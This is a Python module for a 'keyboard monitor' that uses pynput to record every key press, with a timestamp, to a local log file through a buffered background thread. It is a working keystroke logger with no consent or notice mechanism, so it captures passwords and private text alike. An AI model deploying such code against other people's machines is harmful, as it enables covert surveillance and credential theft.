"""
Keyboard monitor – logs key presses to a local log file.
Uses pynput so it works without elevated privileges.
"""

import os
import time
import logging
import threading
from datetime import datetime

from pynput import keyboard

import sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import config

logger = logging.getLogger(__name__)


class KeyboardMonitor:
    """Records keyboard activity to a timestamped log file."""

    def __init__(self):
        self._listener: keyboard.Listener | None = None
        self._buffer: list[str] = []
        self._lock = threading.Lock()
        self._flush_thread: threading.Thread | None = None
        self._stop_event = threading.Event()

    def start(self):
        os.makedirs(config.LOGS_DIR, exist_ok=True)
        self._stop_event.clear()
        self._listener = keyboard.Listener(on_press=self._on_press)
        self._listener.start()
        self._flush_thread = threading.Thread(
            target=self._flush_loop, daemon=True, name="keyboard-flush"
        )
        self._flush_thread.start()
        logger.info("KeyboardMonitor started")

    def stop(self):
        self._stop_event.set()
        if self._listener:
            self._listener.stop()
        if self._flush_thread:
            self._flush_thread.join(timeout=10)
        self._flush()
        logger.info("KeyboardMonitor stopped")

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _on_press(self, key):
        try:
            char = key.char if hasattr(key, "char") and key.char else f"[{key.name}]"
        except AttributeError:
            char = str(key)
        entry = f"{datetime.now().isoformat()} {char}\n"
        with self._lock:
            self._buffer.append(entry)

    def _flush_loop(self):
        while not self._stop_event.wait(config.KEYBOARD_FLUSH_INTERVAL):
            self._flush()

    def _flush(self):
        with self._lock:
            if not self._buffer:
                return
            entries, self._buffer = self._buffer, []
        try:
            with open(config.KEYBOARD_LOG_FILE, "a", encoding="utf-8") as fh:
                fh.writelines(entries)
        except OSError:
            logger.exception("Failed to flush keyboard log")
